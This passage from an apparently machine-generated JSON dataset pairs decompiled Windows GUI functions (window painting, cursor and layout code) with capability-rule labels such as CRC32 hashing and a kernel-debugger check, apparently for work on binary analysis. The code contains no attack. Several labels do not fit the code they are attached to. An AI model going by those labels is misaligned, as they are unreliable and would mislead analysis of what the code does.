        "decompiled_code": "\nvoid fcn.00439314(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4393aa;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.0043952c();\n        fcn.004043b4();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004033e4();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x00439376;\n            }\n            bVar2 = true;\n            goto code_r0x0043937c;\n        }\n    }\ncode_r0x00439376:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x0043937c:\n    fcn.00419a74();\n    if (bVar2) {\n        fcn.0043955c();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4393b1;\n    uStack32 = 0x4393a9;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 465
    },
    "00439bc8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00439bc8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint arg_8h;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    cVar1 = fcn.004033e4();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x9b) != '\\x01')) {\n        fcn.0040b5f4();\n        fcn.004039e4();\n    }\n    fcn.0043a708();\n    if ((*0x463b2c == 0) || (*0x463b2c == -1)) {\n        *0x463b2c = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&uStack28);\n            fcn.00439070();\n            uStack28 = uStack20;\n            arg_8h = fcn.00406974(uStack24);\n            fcn.0043a6d4(arg_8h);\n        }\n        if (*0x463b2c != -1) {\n            fcn.0043787c();\n        }\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "0043b008": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b008(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x43b0b4 == (*0x43b0b0 & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x28] != 0)) && ((*(in_EAX + 0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.0043a708();\n        }\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "0043b800": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0043b800(uint param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.00403454();\n    if (cVar1 != '\\0') {\n        if ((param_2 & 2) == 2) {\n            param_2 = param_2 & 0xfffffffd;\n        }\n        else if ((param_2 & 1) != 1) {\n            param_2 = param_2 | 2;\n        }\n    }\n    uVar2 = fcn.0043b840();\n    return param_2 | uVar2;\n}\n",
        "token_count": 151
    },
    "0043be04": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043be04(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_ECX;\n    uint8_t in_DL;\n    int32_t iVar3;\n    uint32_t *in_FS_OFFSET;\n    uint *puStack92;\n    uint *puStack88;\n    uint *puStack84;\n    uint var_40h;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t nNumerator;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_5h;\n    \n    var_30h = *in_ECX;\n    uStack48 = in_ECX[1];\n    uStack44 = in_ECX[2];\n    uStack40 = in_ECX[3];\n    unique0x100001df = in_EAX;\n    if ((in_DL == 0) || (*(in_DL + 0x461a94) != *(in_EAX + 0x61))) {\n        if ((in_EAX[0x24] != 0) && (in_EAX[0x25] != 0)) {\n            var_ch = in_EAX[0x10];\n            var_10h = in_EAX[0x11];\n            var_14h = in_EAX[0x12];\n            var_18h = in_EAX[0x13];\n            puStack84 = 0x43be88;\n            cVar2 = fcn.0044000c();\n            if (cVar2 == '\\0') {\n                puStack84 = 0x43bebc;\n                fcn.00412708();\n            }\n            else {\n                puStack84 = 0x43be9a;\n                (**(*stack0xfffffff8[0xc] + 0x44))();\n                nNumerator = var_38h;\n                var_1ch = var_34h;\n            }\n            if ((*(stack0xfffffff8 + 0x61) & 4) == 0) {\n                if ((*(stack0xfffffff8 + 0x61) & 1) == 0) {\n                    puStack84 = stack0xfffffff8[0x24];\n                    puStack88 = nNumerator;\n                    puStack92 = stack0xfffffff8[0x22];\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar3 = var_14h >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar3;\n                }\n            }\n            else if ((*(stack0xfffffff8 + 0x61) & 1) == 0) {\n                var_ch = nNumerator - (stack0xfffffff8[0x24] - stack0xfffffff8[0x22]);\n            }\n            else {\n                var_14h = nNumerator - (stack0xfffffff8[0x24] - stack0xfffffff8[0x22]);\n            }\n            if ((*(stack0xfffffff8 + 0x61) & 8) == 0) {\n                if ((*(stack0xfffffff8 + 0x61) & 2) == 0) {\n                    puStack84 = stack0xfffffff8[0x25];\n                    puStack88 = var_1ch;\n                    puStack92 = stack0xfffffff8[0x23];\n                    var_10h = sub.kernel32.dll_MulDiv();\n                    iVar3 = var_18h >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((var_18h & 1) != 0);\n                    }\n                    var_10h = var_10h - iVar3;\n                }\n            }\n            else if ((*(stack0xfffffff8 + 0x61) & 2) == 0) {\n                var_10h = var_1ch - (stack0xfffffff8[0x25] - stack0xfffffff8[0x23]);\n            }\n            else {\n                var_18h = var_1ch - (stack0xfffffff8[0x25] - stack0xfffffff8[0x23]);\n            }\n            *(stack0xfffffff8 + 0x62) = 1;\n            puStack88 = 0x43bffd;\n            puStack92 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffa4;\n            puStack84 = &stack0xfffffffc;\n            (**(*stack0xfffffff8 + 0x84))(var_18h, var_14h);\n            *in_FS_OFFSET = var_18h;\n            *(stack0xfffffff8 + 0x62) = 0;\n            return;\n        }\n        if (in_DL == 0) {\n            return;\n        }\n    }\n    var_14h = *(*(arg_8h + -8) + 8) - **(arg_8h + -8);\n    if (((var_14h < 0) || (in_DL - 3 < 2)) || (in_DL == 6)) {\n        var_14h = in_EAX[0x12];\n    }\n    var_18h = *(*(arg_8h + -8) + 0xc) - *(*(arg_8h + -8) + 4);\n    if (((var_18h < 0) || (in_DL - 1 < 2)) || (in_DL == 6)) {\n        var_18h = in_EAX[0x13];\n    }\n    var_ch = **(arg_8h + -8);\n    var_10h = *(*(arg_8h + -8) + 4);\n    // switch table (7 cases) at 0x43c09a\n    switch(in_DL) {\n    case 1:\n        piVar1 = *(arg_8h + -8) + 4;\n        *piVar1 = *piVar1 + var_18h;\n        break;\n    case 2:\n        piVar1 = *(arg_8h + -8) + 0xc;\n        *piVar1 = *piVar1 - var_18h;\n        var_10h = *(*(arg_8h + -8) + 0xc);\n        break;\n    case 3:\n        **(arg_8h + -8) = **(arg_8h + -8) + var_14h;\n        break;\n    case 4:\n        piVar1 = *(arg_8h + -8) + 8;\n        *piVar1 = *piVar1 - var_14h;\n        var_ch = *(*(arg_8h + -8) + 8);\n        break;\n    case 6:\n        var_ch = in_EAX[0x10];\n        var_10h = in_EAX[0x11];\n        puStack84 = &fcn.0043be04::var_10h;\n        puStack88 = &fcn.0043be04::var_14h;\n        puStack92 = &fcn.0043be04::var_18h;\n        (**(**(arg_8h + -4) + 0xa8))(&fcn.0043be04::var_30h, *(arg_8h + -8));\n    }\n    *(stack0xfffffff8 + 0x62) = 1;\n    puStack88 = 0x43c185;\n    puStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0x84))(var_18h, var_14h);\n    *in_FS_OFFSET = var_18h;\n    *(stack0xfffffff8 + 0x62) = 0;\n    return;\n}\n",
        "token_count": 1812
    },
    "0043cb94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cb94(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x43ccb2;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00402c64();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.0043cb2c();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x69) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[100];\n    }\n    else {\n        iVar2 = fcn.0043fd08();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x463664;\n    fcn.004031a8();\n    fcn.0040420c();\n    fcn.00408674();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x43ccb9;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 651
    },
    "0043de98": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043de98(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint var_6ch;\n    uint nWidth;\n    uint var_5ch;\n    uint nHeight;\n    uint var_4ch;\n    uint var_ch;\n    uint hgdiobj;\n    uint hdc;\n    \n    if ((*(in_EAX + 0x7e) != '\\0') && (*(param_2 + 4) == 0)) {\n        uStack128 = 0;\n        uStack132 = 0x43dee8;\n        uVar2 = sub.user32.dll_GetDC();\n        uStack132 = 0x43def4;\n        (**(*in_EAX + 0x44))();\n        uStack136 = 0x43df02;\n        (**(*in_EAX + 0x44))();\n        uStack144 = 0x43df0c;\n        uStack140 = uVar2;\n        hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack148 = 0;\n        uStack152 = 0x43df17;\n        uStack144 = uVar2;\n        sub.user32.dll_ReleaseDC();\n        uStack152 = 0;\n        uStack156 = 0x43df1e;\n        uStack160 = sub.gdi32.dll_CreateCompatibleDC();\n        uStack156 = hgdiobj;\n        puStack164 = 0x43df2e;\n        hdc = uStack160;\n        var_ch = sub.gdi32.dll_SelectObject();\n        uStack168 = 0x43dfea;\n        uStack172 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff54;\n        puStack164 = &stack0xfffffffc;\n        uVar2 = fcn.0043fd08(&fcn.0043de98::var_4ch);\n        uVar2 = sub.user32.dll_BeginPaint(uVar2);\n        fcn.0043a6d4(hdc);\n        *(param_2 + 4) = hdc;\n        fcn.0043de98();\n        *(param_2 + 4) = 0;\n        (**(*in_EAX + 0x44))(hdc, 0, 0, 0xcc0020);\n        (**(*in_EAX + 0x44))(nHeight);\n        sub.gdi32.dll_BitBlt(uVar2, 0, 0, nWidth);\n        uVar2 = fcn.0043fd08(&fcn.0043de98::var_4ch);\n        sub.user32.dll_EndPaint();\n        *in_FS_OFFSET = uVar2;\n        sub.gdi32.dll_SelectObject(hdc, var_ch, 0x43dff1);\n        sub.gdi32.dll_DeleteDC(hdc);\n        sub.gdi32.dll_DeleteObject(hgdiobj);\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        uStack128 = 0x43dec1;\n        iVar1 = fcn.0043ca38();\n        if (iVar1 == 0) {\n            uStack128 = 0x43dece;\n            (**(*in_EAX + -0x10))();\n            return;\n        }\n    }\n    uStack128 = 0x43dedc;\n    fcn.0043d9bc();\n    return;\n}\n",
        "token_count": 837
    },
    "0043e1e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e1e4(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint16_t uVar5;\n    \n    if ((((*(in_EAX + 0x1a5) == '\\0') || ((*(in_EAX + 0x50) & 0x10) == 0)) || (*(in_EAX + 0x30) == 0)) ||\n       ((*(*(param_2 + 8) + 0x18) & 8) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if ((*(*(param_2 + 8) + 0x18) & 2) == 0) {\n        iVar4 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x180), param_1);\n        if (iVar4 == 0) goto code_r0x0043e229;\n        uVar2 = 1;\n    }\n    else {\ncode_r0x0043e229:\n        uVar2 = 0;\n    }\n    if ((*(*(param_2 + 8) + 0x18) & 1) == 0) {\n        iVar4 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x180));\n        if (iVar4 != 0) {\n            uVar3 = 1;\n            goto code_r0x0043e251;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0043e251:\n    uVar5 = CONCAT11(uVar3, uVar2);\n    if ((bVar1) && ((uVar2 | uVar5 >> 8) != 0)) {\n        fcn.0043fc10();\n    }\n    if ((*(in_EAX + 0x55) & 2) == 0) {\n        fcn.00440018();\n    }\n    fcn.0043b008();\n    if ((bVar1) && (((uVar5 | uVar5 >> 8) != 0 || ((*(*(param_2 + 8) + 0x18) & 0xc0) != 0)))) {\n        fcn.0043fc10();\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "0043e2a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e2a4(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x43e2f0 == (*0x43e2ec & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.0043ac64();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 189
    },
    "0043e2f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0043e2f4(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00440018();\n    (**(*in_EAX + -0x10))();\n    fcn.0043c5c8();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.00403454();\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0043ed90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043ed90(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    if ((*(in_EAX + 0x1a6) != '\\0') && (in_EAX = fcn.0043ca38(),  piVar2 = in_EAX,  -1 < in_EAX + -1)) {\n        do {\n            piVar1 = fcn.0043c9fc();\n            in_EAX = piVar1;\n            if (((*(piVar1 + 0x57) != '\\0') && (in_EAX = (**(*piVar1 + 0x50))(),  in_EAX != '\\0')) &&\n               ((((*(piVar1 + 0x52) & 1) != 0 && (in_EAX = fcn.0043a6d4(*(*(arg_8h + -4) + 8)),  in_EAX != NULL)) ||\n                ((in_EAX = fcn.004033e4(),  in_EAX != '\\0' && (in_EAX = fcn.0043ed90(arg_8h),  in_EAX != '\\0')))))) {\n                var_5h = 1;\n                break;\n            }\n            piVar2 = piVar2 + -1;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX & 0xffffff00 | var_5h;\n}\n",
        "token_count": 360
    },
    "00440aac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440aac(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint var_3ch;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x165) == '\\0') && (in_EAX[0x5b] == 0)) {\n        uStack80 = 0x440d24;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x440d29;\n        fcn.0042f140();\n        uStack80 = 0x440d2e;\n        cVar3 = fcn.0042f220();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x440d40;\n            fcn.0042f140();\n            uStack80 = 0x440d4a;\n            fcn.0042f96c();\n        }\n        return;\n    }\n    uStack80 = 0x440adf;\n    uStack80 = fcn.0043fd08();\n    puStack84 = 0x440ae5;\n    var_ch = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x440d12;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.0043fd08(&fcn.00440aac::var_1ch);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.0043fd08(&fcn.00440aac::var_2ch);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.0043fd08(&fcn.00440aac::var_2ch, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.00440aac::var_1ch, -var_2ch, -var_28h);\n    sub.gdi32.dll_ExcludeClipRect(var_ch, var_1ch, var_18h, var_14h, var_10h);\n    iVar2 = var_28h;\n    iVar1 = var_2ch;\n    sub.user32.dll_InflateRect(&fcn.00440aac::var_1ch, var_4h[0x5b], var_4h[0x5b]);\n    var_2ch = var_1ch;\n    var_28h = var_18h;\n    var_24h = var_14h;\n    var_20h = var_10h;\n    if (*(var_4h + 0x165) != '\\0') {\n        iVar8 = 0;\n        if (*(var_4h + 0x163) != '\\0') {\n            iVar8 = var_4h[0x5a];\n        }\n        if (*(var_4h + 0x59) != '\\0') {\n            iVar8 = iVar8 + var_4h[0x5a];\n        }\n        uVar4 = fcn.0043fd08(0xfffffff0);\n        uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n        if ((*(var_4h + 0x162) & 1) != 0) {\n            var_2ch = var_2ch - iVar8;\n        }\n        if ((*(var_4h + 0x162) & 2) != 0) {\n            var_28h = var_28h - iVar8;\n        }\n        if ((*(var_4h + 0x162) & 4) != 0) {\n            var_24h = var_24h + iVar8;\n        }\n        if ((uVar5 & 0x200000) != 0) {\n            iVar6 = (***0x461f44)(0x14);\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x162) & 8) != 0) {\n            var_20h = var_20h + iVar8;\n        }\n        if ((uVar5 & 0x100000) != 0) {\n            iVar8 = (***0x461f44)(0x15);\n            var_20h = var_20h + iVar8;\n        }\n        sub.user32.dll_DrawEdge\n                  (var_ch, &fcn.00440aac::var_2ch, \n                   *(*(var_4h + 0x163) * 4 + 0x461b58) | *(*(var_4h + 0x59) * 4 + 0x461b68), \n                   *(var_4h + 0x162) | *(*(var_4h + 0x165) * 4 + 0x461b78) | *(*(var_4h + 0x1a5) * 4 + 0x461b88) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(var_ch, var_2ch, var_28h, var_24h, var_20h);\n    sub.user32.dll_OffsetRect(&fcn.00440aac::var_2ch, -iVar1, -iVar2);\n    uVar7 = fcn.0041d0f0();\n    uVar4 = var_ch;\n    sub.user32.dll_FillRect(var_ch, &fcn.00440aac::var_2ch, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.0043fd08(var_ch, 0x440d19);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1490
    },
    "00448db0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.00448db0(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "00449fc8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00449fc8(uint32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x44a8b0;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puVar2 = &stack0xfffffffc;\n    if (*(lprc - 0x21) != '\\0') {\n        if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n            puVar2 = &stack0xfffffffc;\n            if (*(lprc + 8) != '\\0') {\n                fcn.0041d0bc();\n                puVar2 = puStack24;\n            }\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            fcn.0041d0bc();\n            fcn.0041c8f0();\n            puVar2 = puStack24;\n        }\n    }\n    puStack24 = puVar2;\n    if ((*(lprc - 0x29) == '\\0') || (*(lprc - 0x21) != '\\0')) {\n        fcn.0041d460();\n    }\n    if (*(lprc - 0x30) == 0) {\n        cVar3 = fcn.004033e4();\n        if (cVar3 == '\\0') {\n            *(lprc - 0x31) = 0;\n        }\n        else {\n            *(lprc - 0x31) = *(*(lprc - 0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc - 0x31) = 0;\n    }\n    *(lprc - 0x10) = *(lprc - 0x20) + 1;\n    iVar5 = *(lprc - 0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc - 0xc) = iVar5;\n    fcn.004043b4();\n    if (bVar9) {\n        fcn.0041d460();\n        *(lprc - 0x10) = 0;\n        *(lprc - 8) = 0xfffffffc;\n        *(lprc - 0x39) = 0;\n    }\n    else {\n        if ((*(lprc - 0x40) == 0) ||\n           (((iVar5 = *(*(lprc - 0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00446b64(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc - 0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0'))))\n            )))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc - 0x41) = uVar4;\n        if ((*(lprc - 0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0')))) {\n            if ((*(lprc - 0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc - 8) = *(lprc - 0x10);\n                *(lprc - 4) = *(lprc - 0xc);\n            }\n            else {\n                *(lprc - 8) = *(lprc - 0x10) + *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            *(lprc - 0x39) = 0;\n        }\n        else {\n            *(lprc - 0x39) = 1;\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 8) = *(lprc - 0x10) + 0x10;\n                *(lprc - 4) = *(lprc - 0xc) + 0x10;\n            }\n            else {\n                *(lprc - 8) = *(lprc - 0x10) + *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            if ((*(*(lprc - 0x38) + 0x38) != '\\0') && (*(lprc - 0x21) == '\\0')) {\n                *(lprc - 8) = *(lprc - 8) + 1;\n                *(lprc - 4) = *(lprc - 4) + 1;\n                uVar7 = fcn.0041d0b4();\n                *(lprc - 0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.0041d0b4();\n                    *(lprc - 0x48) = uVar7;\n                    fcn.00423b70();\n                    fcn.0041d090();\n                    fcn.0041d460();\n                }\n                else {\n                    fcn.0041d0bc();\n                    fcn.0041d460();\n                }\n                fcn.0041d0bc();\n                *(lprc - 0x10) = *(lprc - 0x10) + 1;\n                *(lprc - 0xc) = *(lprc - 0xc) + 1;\n            }\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 0x5c) = *(lprc - 0x10);\n                *(lprc - 0x58) = *(lprc - 0xc);\n                *(lprc - 0x54) = *(lprc - 8);\n                *(lprc - 0x50) = *(lprc - 4);\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc - 8) - *(lprc - 0x10)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc - 8) - *(lprc - 0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 0x10) = iVar5 + *(lprc - 0x10) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    *(lprc - 8) = iVar5 + *(lprc - 0x10);\n                }\n                iVar5 = (**(**(*(lprc - 